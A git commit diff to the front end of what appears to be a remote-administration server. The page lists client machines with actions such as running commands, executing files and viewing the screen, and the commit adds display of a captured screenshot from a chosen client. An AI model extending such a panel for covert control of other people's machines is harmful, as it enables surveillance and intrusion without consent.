ab464322369b7244a4069725c675c881159004c8
antonii1357 <antonii.spam@gmail.com>
2024-07-31 14:27:14 -0600

    Added implementation for displaying the screenshot buffer received in request

--- Server/public/index.js
+++ Server/public/index.js
@@ -1,7 +1,7 @@
 function createTd(text, button, listener) {
 	const cell = document.createElement('td')
 	button ? (cell.innerHTML = `<button>${text}</button>`) : (cell.innerText = text)
-	if (typeof listener === "function") cell.addEventListener('click', listener)
+	if (typeof listener === 'function') cell.addEventListener('click', listener)
 	return cell
 }
 
@@ -9,18 +9,28 @@ function populateTable(data) {
 	data.forEach((item) => {
 		const table = document.getElementById('clients')
 		const tableBody = table.getElementsByTagName('tbody')[0]
-		const row = document.createElement('tr')        
+		const row = document.createElement('tr')
 		row.appendChild(createTd(item.clientId))
-        
+
 		const actions = ['Run Command', 'Upload file', 'Execute file', 'Open file', 'View Screen']
 		actions.forEach((action) => {
-			if (action == 'View Screen') return row.appendChild(createTd(action, true, () => {
-				fetch('/screenshot', {
-					method: 'POST',
-					body: JSON.stringify({ clientId: item.clientId }),
-				}).then(res => console.log(res))
-			
-			}))
+			if (action == 'View Screen')
+				return row.appendChild(
+					createTd(action, true, () => {
+						fetch('/screenshot', {
+							method: 'POST',
+							headers: {'Content-Type': 'application/json'},
+							body: JSON.stringify({clientId: item.clientId})
+						})
+							.then((res) => res.json())
+							.then((screenshotData) => {
+								const img = document.getElementById('ss-img')
+								img.src = `data:image/png;base64,${screenshotData.buffer}`
+								document.getElementById('ss-container').classList.remove('hidden')
+							})
+							.catch((error) => console.error('Error fetching screenshot:', error))
+					})
+				)
 			row.appendChild(createTd(action, true, () => true))
 		})
 
@@ -32,7 +42,9 @@ function populateTable(data) {
 }
 fetch('/clients')
 	.then((res) => res.json())
-    .then((res) => {
-        console.log(res)
-        populateTable(res)
-    })
+	.then((res) => {
+		console.log(res)
+		populateTable(res)
+	})
+
+document.getElementById('close').addEventListener('click', () => 	document.getElementById('ss-container').classList.add('hidden'))
